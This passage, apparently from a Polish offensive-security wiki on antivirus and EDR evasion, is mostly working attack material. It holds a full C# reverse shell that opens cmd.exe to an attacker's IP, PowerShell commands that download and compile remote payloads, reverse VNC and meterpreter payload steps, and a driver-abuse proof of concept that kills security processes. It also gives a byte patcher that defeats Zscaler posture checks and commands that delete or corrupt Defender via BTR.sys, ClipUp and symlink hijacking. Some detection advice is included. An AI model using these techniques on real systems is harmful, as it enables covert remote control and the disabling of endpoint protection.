**attacker** powinien **uruchomić na swoim** **hoście** plik binarny `vncviewer.exe -listen 5900`, aby był **gotowy** do przechwycenia reverse **VNC connection**. Następnie na **victim**: uruchom demona winvnc `winvnc.exe -run` i wykonaj `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**OSTRZEŻENIE:** Aby zachować niewykrywalność, nie wolno robić kilku rzeczy

- Nie uruchamiaj `winvnc`, jeśli już działa, bo wywołasz [popup](https://i.imgur.com/1SROTTl.png). Sprawdź, czy działa, za pomocą `tasklist | findstr winvnc`
- Nie uruchamiaj `winvnc` bez pliku `UltraVNC.ini` w tym samym katalogu, bo otworzy się [okno konfiguracji](https://i.imgur.com/rfMQWcf.png)
- Nie uruchamiaj `winvnc -h`, aby wyświetlić pomoc, bo wywołasz [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pobierz z: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

W GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Teraz **uruchom listener** za pomocą `msfconsole -r file.rc` i **wykonaj** **payload XML** za pomocą:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Obecny Defender bardzo szybko zakończy proces.**

### Kompilowanie własnego reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Pierwszy C# Revershell

Skompiluj go za pomocą:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Użyj tego z:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# z użyciem kompilatora

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatyczne pobieranie i uruchamianie:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuscatorów C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Przykład użycia Pythona do budowania injectorów:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Inne narzędzia

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Więcej

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Unieszkodliwianie AV/EDR z poziomu jądra

Storm-2603 wykorzystał niewielkie narzędzie konsolowe o nazwie **Antivirus Terminator**, aby wyłączyć zabezpieczenia punktów końcowych przed wdrożeniem ransomware. Narzędzie dostarcza **własny, podatny, ale *podpisany* sterownik** i nadużywa go do wykonywania uprzywilejowanych operacji jądra, których nie mogą zablokować nawet usługi AV działające jako Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Najważniejsze informacje
1. **Podpisany sterownik**: Plik zapisywany na dysku to `ServiceMouse.sys`, ale jest to legalnie podpisany sterownik binarny `AToolsKrnl64.sys` z „System In-Depth Analysis Toolkit” firmy Antiy Labs. Ponieważ sterownik ma prawidłowy podpis Microsoftu, ładuje się nawet przy włączonym Driver-Signature-Enforcement (DSE).
2. **Instalacja usługi**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Pierwszy wiersz rejestruje sterownik jako **usługę jądra**, a drugi go uruchamia, dzięki czemu `\\.\ServiceMouse` staje się dostępny z przestrzeni użytkownika.
3. **IOCTL-e udostępniane przez sterownik**
   | Kod IOCTL | Możliwość                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Zakończenie dowolnego procesu na podstawie PID (używane do zabijania usług Defender/EDR) |
   | `0x990000D0` | Usunięcie dowolnego pliku z dysku |
   | `0x990001D0` | Wyładowanie sterownika i usunięcie usługi |

   Minimalny proof-of-concept w C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Dlaczego to działa**: BYOVD całkowicie omija zabezpieczenia trybu użytkownika; kod wykonujący się w jądrze może otwierać *chronione* procesy, kończyć je lub manipulować obiektami jądra, niezależnie od PPL/PP, ELAM i innych funkcji hardeningu.

Wykrywanie / łagodzenie skutków
•  Włącz listę blokowania podatnych sterowników Microsoftu (`HVCI`, `Smart App Control`), aby system Windows odmawiał załadowania `AToolsKrnl64.sys`.
•  Monitoruj tworzenie nowych usług *jądra* i generuj alerty, gdy sterownik zostanie załadowany z katalogu z prawami zapisu dla wszystkich lub nie znajduje się na liście dozwolonych.
•  Wypatruj uchwytów z trybu użytkownika do niestandardowych obiektów urządzeń, po których następują podejrzane wywołania `DeviceIoControl`.

### Omijanie kontroli stanu urządzenia Zscaler Client Connector przez modyfikację binariów na dysku

Zscaler **Client Connector** lokalnie stosuje reguły stanu urządzenia i korzysta z Windows RPC, aby przekazywać wyniki innym komponentom. Dwie słabe decyzje projektowe umożliwiają całkowite obejście zabezpieczeń:

1. Ocena stanu urządzenia odbywa się **w całości po stronie klienta** (na serwer wysyłana jest wartość logiczna).
2. Wewnętrzne punkty końcowe RPC weryfikują jedynie, czy łączący się plik wykonywalny jest **podpisany przez Zscaler** (za pomocą `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Modyfikując na dysku cztery podpisane pliki binarne**, można zneutralizować oba mechanizmy:

| Plik binarny | Zmodyfikowana oryginalna logika | Wynik |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Zawsze zwraca `1`, więc każdy test kończy się wynikiem zgodnym |
| `ZSAService.exe` | Pośrednie wywołanie `WinVerifyTrust` | Zastąpione instrukcjami NOP ⇒ dowolny proces (nawet niepodpisany) może połączyć się z potokami RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zastąpione przez `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Kontrole integralności tunelu | Pominięte |

Minimalny fragment patchera:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Po zastąpieniu oryginalnych plików i ponownym uruchomieniu stosu usług:

* **Wszystkie** kontrole stanu wyświetlają **zielony status/zgodność**.
* Niepodpisane lub zmodyfikowane pliki binarne mogą otwierać punkty końcowe RPC nazwanych potoków (np. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Zhakowany host uzyskuje nieograniczony dostęp do sieci wewnętrznej zdefiniowanej przez zasady Zscaler.

To studium przypadku pokazuje, jak za pomocą kilku poprawek bajtów można obejść decyzje o zaufaniu podejmowane wyłącznie po stronie klienta oraz proste kontrole sygnatur.

## Nadużycie zaufanej funkcjonalności Microsoft Defender `BTR.sys`

Sterownik **Boot-Time Removal** w Defenderze stanowi przydatny kontrprzykład dla klasycznego BYOVD. `BTR.sys` to legalny komponent naprawczy podpisany przez Microsoft, bez błędu powodującego uszkodzenie pamięci i bez interfejsu IOCTL; po uzyskaniu dostępu administratora i `SeLoadDriverPrivilege` operator może zamiast tego sfałszować prywatną transakcję naprawczą sterownika i wykonać zamierzone operacje na plikach/rejestrze w Ring-0. Jest to **mechanizm neutralizacji AV/EDR po przejęciu hosta, a nie sposób uzyskania początkowego dostępu ani eskalacji uprawnień**. Sterownik można wyodrębnić z zasobu `BOOTTIMETOOL` w pliku `MpEngine.dll` znajdującym się na zaatakowanym hoście, zamiast importować rzucający się w oczy sterownik innej firmy.<sup>[[36]](#references)</sup>

### Przygotowanie jednorazowego sterownika

Defender zwykle zapisuje zasób jako plik o losowej nazwie `[a-z]{8}.sys` i rejestruje usługę jądra o podobnej nazwie. `DriverEntry` odczytuje wartość `Args` usługi, otwiera wskazany strumień ADS systemu NTFS, odszyfrowuje i weryfikuje listę działań, zapisuje informacje zwrotne, a po pomyślnym wykonaniu zwraca `0xC0000056` (`STATUS_DELETE_PENDING`), aby sterownik został wyładowany zamiast pozostać załadowanym. Sfałszowana usługa ma następujące charakterystyczne wartości.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Strumień `:changelist` zawiera jeden zaszyfrowany blob RC4. W analizowanych kompilacjach używany jest stały klucz o długości 256 bajtów, więc szyfrowanie nie stanowi granicy autoryzacji. Prawidłowy tekst jawny zawiera 24-bajtowy nagłówek globalny (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC nagłówka i identyfikator transakcji wyliczony na podstawie payloadu), po którym następuje zakończona znakiem null ścieżka sprzężenia zwrotnego w formacie UTF-16 oraz dowolna liczba elementów. Każdy element ma 16-bajtowy nagłówek (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) oraz dane zależne od akcji, zakończone **dokładnie czterema bajtami NUL**. Każdy obszar nagłówka/danych jest osobno sprawdzany za pomocą CRC-32 z wielomianem `0xEDB88320`, stanem początkowym `0xFFFFFFFF` i **bez końcowego XOR** (`~CRC32`); stan CRC jest resetowany dla każdego obszaru.<sup>[[36]](#references)[[37]](#references)</sup>

Akceptowane identyfikatory akcji udostępniają następujące prymitywy jądra.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Dane elementu | Wynik |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Usunięcie pliku, także zablokowanego |
| 2 | `[UTF-16 path]` | Usunięcie pustego katalogu |
| 3 | `[Flags][source][destination]` | Przeniesienie pliku do chronionej ścieżki wybranej przez atakującego; puste pole destination oznacza usunięcie |
| 4 | `[Flags][key path]` | Rekurencyjne usunięcie klucza rejestru |
| 5 | `[Flags][key path + "\\" + value]` | Usunięcie wartości rejestru |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Utworzenie/zaktualizowanie wartości rejestru i utworzenie brakujących ścieżek kluczy |

W przypadku akcji 5 i 6 separatorem klucza/wartości w danych przesyłanych jest **dwa kolejne ukośniki odwrotne**; konwencjonalnie sformatowana ścieżka nie zostanie poprawnie podzielona. Plik sprzężenia zwrotnego w większości odzwierciedla żądanie, ale pierwsze cztery bajty danych każdego elementu stają się jego wynikowym `NTSTATUS`. W przypadku akcji 1 i 2, które nie mają początkowego pola flags, BTR przesuwa ścieżkę do czterech zarezerwowanych bajtów końcowych, aby zrobić miejsce na ten status.<sup>[[36]](#references)</sup>

### Przepływ pracy `BTR_CLI` i okno wczesnego rozruchu

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) realizuje cały łańcuch: wyodrębnia `BTR.sys` z lokalnego Defendera, tworzy `<random>.sys:changelist` i strumień sprzężenia zwrotnego, serializuje/sumuje kontrolnie/szyfruje łańcuch akcji, bezpośrednio tworzy klucz rejestru usługi, a następnie wywołuje `NtLoadDriver` dla `-trigger now` albo pozostawia sterownik jako uruchamiany przy starcie systemu dla `-trigger boot`. Bezpośrednie przygotowanie wpisu w rejestrze omija standardową ścieżkę SCM `CreateServiceW`, przez co **nie powoduje** wygenerowania zdarzenia instalacji usługi Event ID 7045. Artefakty uruchamiane podczas rozruchu można później usunąć poleceniem `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` nie jest użyteczne, ponieważ BTR wykonuje operacje wejścia/wyjścia na plikach z poziomu `DriverEntry`, zanim stos pamięci masowej i link `SystemRoot` będą gotowe. `Start=1` wraz z grupą o wysokim priorytecie `Boot Bus Extender` powoduje uruchomienie w fazie 1: NTFS jest już dostępny, ale wiele sterowników zabezpieczeń uruchamianych podczas startu systemu oraz usług EDR w trybie użytkownika nie zostało jeszcze zainicjowanych. Filtry uruchamiane podczas startu systemu, takie jak `WdFilter`, mogą być już załadowane, jednak BTR może usunąć ich pliki binarne lub konfigurację usługi przed następnym uruchomieniem systemu, a pliki wykonywalne usług — zanim SCM je uruchomi. ELAM nie eliminuje tej luki, ponieważ BTR działa po ocenie sterowników startowych i ma prawidłowy podpis Microsoft.<sup>[[36]](#references)</sup>

Wiele działań wykonuje się w ramach jednej transakcji. PoC dodaje na początku działanie 1 dla zakodowanego na stałe pliku `\SystemRoot\Temp\BootClean.log`: BTR tworzy ten dziennik, a następnie realizuje własne żądanie usunięcia i usuwa go przed wyładowaniem. Ogranicza to ilość pozostawionych śladów, a zapisanie informacji zwrotnej w `<random>.sys:<random>.dat` umożliwia jednoczesne usunięcie sterownika i obu strumieni.<sup>[[36]](#references)[[37]](#references)</sup>

### Korelacje detekcji o wysokiej wartości sygnałowej

Reguły oparte wyłącznie na sygnaturach i lista blokowanych podatnych sterowników Microsoftu nie rozwiązują problemu nadużywania zamierzonej funkcjonalności BTR. Preferuj następujące korelacje behawioralne, odróżniając przy tym legalne pochodzenie z Defendera od dowolnego programu uruchamiającego.<sup>[[36]](#references)</sup>

- **Sysmon 15:** utworzenie `.sys:changelist` jest typowe dla etapowania BTR. Dołączenie ADS `.dat` do tego samego pliku `.sys` jest szczególnie podejrzane, ponieważ legalny Defender zwykle umieszcza informacje zwrotne w `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bez System 7045:** koreluj bezpośrednie utworzenie `HKLM\SYSTEM\CurrentControlSet\Services\<random>`, zawierającego `Args=...:changelist` i `Group=Boot Bus Extender`, z brakiem odpowiadającego mu zdarzenia instalacji SCM.
- **Sysmon 6 -> 23:** koreluj załadowanie znanego sterownika BTR z procesu spoza łańcucha pochodzenia Defendera z późniejszym usunięciem pliku przypisanym do `System`/PID 4, szczególnie gdy dotyczy to plików binarnych związanych z bezpieczeństwem.
- **Sysmon 11 -> 23:** generuj alerty w przypadku szybkiego utworzenia i usunięcia `\SystemRoot\Temp\BootClean.log` przez `System`/PID 4.
- Ogranicz i audytuj nadawanie/włączanie `SeLoadDriverPrivilege`; sam podpis Microsoftu nie wystarcza, by uznać za zaufaną sytuację, w której sterownik narzędzia bezpieczeństwa jest etapowany przez `cmd.exe`, PowerShell lub nieznany proces.

## Nadużywanie Protected Process Light (PPL) do manipulowania AV/EDR za pomocą LOLBIN-ów

Protected Process Light (PPL) wymusza hierarchię poziomów i sygnatariuszy, dzięki czemu tylko chronione procesy o równym lub wyższym poziomie mogą manipulować sobą nawzajem. Z perspektywy ofensywnej, jeśli możesz legalnie uruchomić plik binarny z włączonym PPL i kontrolować jego argumenty, możesz przekształcić nieszkodliwą funkcjonalność (np. rejestrowanie) w ograniczoną operację zapisu wspieraną przez PPL, skierowaną przeciwko chronionym katalogom używanym przez AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Co sprawia, że proces działa jako PPL
- Docelowy plik EXE (oraz wszystkie załadowane biblioteki DLL) musi być podpisany przy użyciu EKU obsługującego PPL.
- Proces musi zostać utworzony za pomocą CreateProcess z flagami: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Należy zażądać zgodnego poziomu ochrony, odpowiadającego sygnatariuszowi pliku binarnego (np. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` dla sygnatariuszy oprogramowania antywirusowego, `PROTECTION_LEVEL_WINDOWS` dla sygnatariuszy Windows). Nieprawidłowe poziomy spowodują niepowodzenie tworzenia procesu.

Zobacz także szersze wprowadzenie do PP/PPL i ochrony LSASS:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Narzędzia do uruchamiania
- Pomocnicze narzędzie open source: CreateProcessAsPPL (wybiera poziom ochrony i przekazuje argumenty do docelowego pliku EXE):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Sposób użycia:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Podpisany plik systemowy `C:\Windows\System32\ClipUp.exe` uruchamia własny proces potomny i przyjmuje parametr umożliwiający zapis pliku dziennika w ścieżce wskazanej przez użytkownika.
- Po uruchomieniu jako proces PPL zapis pliku odbywa się z uprawnieniami PPL.
- ClipUp nie potrafi przetwarzać ścieżek zawierających spacje; użyj krótkich ścieżek 8.3, aby wskazać zwykle chronione lokalizacje.

Pomocniki do krótkich ścieżek 8.3
- Wyświetl krótkie nazwy: `dir /x` w każdym katalogu nadrzędnym.
- Wyznacz krótką ścieżkę w cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Łańcuch nadużycia (w zarysie)
1) Uruchom LOLBIN obsługujący PPL (ClipUp) z użyciem `CREATE_PROTECTED_PROCESS` za pomocą programu uruchamiającego (np. CreateProcessAsPPL).
2) Przekaż argument ścieżki pliku dziennika ClipUp, aby wymusić utworzenie pliku w chronionym katalogu AV (np. Defender Platform). W razie potrzeby użyj krótkich nazw 8.3.
3) Jeśli AV zwykle otwiera/blokuje docelowy plik binarny podczas działania (np. MsMpEng.exe), zaplanuj zapis podczas rozruchu, zanim uruchomi się AV, instalując usługę autostartu, która niezawodnie uruchamia się wcześniej. Zweryfikuj kolejność rozruchu za pomocą Process Monitor (rejestrowanie rozruchu).
4) Po ponownym uruchomieniu zapis z uprawnieniami PPL następuje, zanim AV zablokuje swoje pliki binarne, uszkadzając plik docelowy i uniemożliwiając uruchomienie.

Przykładowe wywołanie (ścieżki ukryte/skrótowe ze względów bezpieczeństwa):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Uwagi i ograniczenia
- Nie można kontrolować zawartości zapisywanej przez ClipUp — można określić jedynie jej lokalizację; ta prymitywna technika nadaje się do uszkadzania, a nie precyzyjnego wstrzykiwania zawartości.
- Do zainstalowania/uruchomienia usługi i wykorzystania okna restartu wymagane są lokalne uprawnienia administratora/SYSTEM.
- Kluczowe znaczenie ma czas: cel nie może być otwarty; wykonanie podczas rozruchu pozwala uniknąć blokad plików.

Wykrywanie
- Utworzenie procesu `ClipUp.exe` z nietypowymi argumentami, szczególnie gdy jego proces nadrzędny jest niestandardowym programem uruchamiającym, w okolicy rozruchu.
- Nowe usługi skonfigurowane do automatycznego uruchamiania podejrzanych plików binarnych, które konsekwentnie uruchamiają się przed Defender/AV. Zbadaj utworzenie/modyfikację usług poprzedzające awarie uruchamiania Defendera.
- Monitorowanie integralności plików binarnych Defendera/katalogów Platform; nieoczekiwane utworzenie/modyfikacja plików przez procesy z flagami protected-process.
- Telemetria ETW/EDR: szukaj procesów utworzonych z `CREATE_PROTECTED_PROCESS` oraz anomalii w użyciu poziomów PPL przez pliki binarne inne niż AV.

Środki zaradcze
- WDAC/Code Integrity: ogranicz, które podpisane pliki binarne mogą działać jako PPL i w kontekście których procesów nadrzędnych; blokuj wywołanie ClipUp poza uzasadnionymi przypadkami.
- Higiena usług: ogranicz tworzenie/modyfikowanie usług uruchamianych automatycznie i monitoruj manipulowanie kolejnością uruchamiania.
- Upewnij się, że ochrona przed naruszeniem Defendera i zabezpieczenia early-launch są włączone; zbadaj błędy uruchamiania wskazujące na uszkodzenie plików binarnych.
- Rozważ wyłączenie generowania krótkich nazw 8.3 na woluminach, na których znajdują się narzędzia bezpieczeństwa, jeśli jest to zgodne z Twoim środowiskiem (dokładnie przetestuj).

## Manipulowanie Microsoft Defender przez przejęcie symlinków folderu wersji Platform

Windows Defender wybiera platformę, z której działa, przez wyliczenie podfolderów w:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Wybiera podfolder z najwyższym leksykograficznie ciągiem wersji (np. `4.18.25070.5-0`), a następnie uruchamia z niego procesy usługi Defender (odpowiednio aktualizując ścieżki usługi/rejestru). Mechanizm wyboru ufa wpisom katalogu, w tym punktom ponownej analizy katalogów (symlinkom). Administrator może to wykorzystać, aby przekierować Defendera do ścieżki zapisywalnej przez atakującego i uzyskać DLL sideloading lub zakłócić działanie usługi.<sup>[[21]](#references)[[22]](#references)</sup>

Wymagania wstępne
- Lokalny administrator (wymagany do utworzenia katalogów/symlinków w folderze Platform)
- Możliwość ponownego uruchomienia systemu lub wywołania ponownego wyboru platformy Defendera (restart usługi przy rozruchu)
- Wymagane są wyłącznie wbudowane narzędzia (`mklink`)

Dlaczego to działa
- Defender blokuje zapisy w swoich folderach, ale wybór platformy ufa wpisom katalogu i wybiera leksykograficznie najwyższą wersję, nie sprawdzając, czy ścieżka docelowa prowadzi do chronionej/zaufanej lokalizacji.

Kroki (przykład)
1) Przygotuj zapisywalną kopię bieżącego folderu platformy, np. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Utwórz wewnątrz Platform dowiązanie symboliczne katalogu o wyższej wersji, wskazujące na swój folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Wybór wyzwalacza (zalecane ponowne uruchomienie):
```cmd
shutdown /r /t 0
```
4) Sprawdź, czy MsMpEng.exe (WinDefend) działa ze ścieżki przekierowanej:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
You should observe the new process path under `C:\TMP\AV\` and the service configuration/registry odzwierciedlające tę lokalizację.

Post-exploitation options
- DLL sideloading/code execution: Umieść lub podmień biblioteki DLL ładowane przez Defendera z jego katalogu aplikacji, aby wykonywać kod w procesach Defendera. Zobacz sekcję powyżej: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Usuń symlink wersji, aby przy następnym uruchomieniu skonfigurowana ścieżka nie wskazywała na żaden plik, a Defender nie mógł się uruchomić:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Pamiętaj, że ta technika sama w sobie nie zapewnia eskalacji uprawnień; wymaga praw administratora.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Zespoły red team mogą przenieść runtime evasion z implantu C2 do samego modułu docelowego, hookując jego Import Address Table (IAT) i kierując wybrane API przez kontrolowany przez atakującego, niezależny od położenia kod (PIC). Pozwala to uogólnić evasion poza niewielki zestaw API udostępniany przez wiele kitów (np. CreateProcessA) i rozszerzyć te same zabezpieczenia na BOF-y oraz biblioteki DLL używane w post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Podejście na wysokim poziomie
- Umieść blob PIC obok modułu docelowego za pomocą reflective loadera (z przodu lub jako moduł towarzyszący). PIC musi być samowystarczalny i niezależny od położenia.
- Podczas ładowania hostującej biblioteki DLL przejdź przez jej IMAGE_IMPORT_DESCRIPTOR i zmień wpisy IAT docelowych importów (np. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), aby wskazywały na cienkie wrappery PIC.
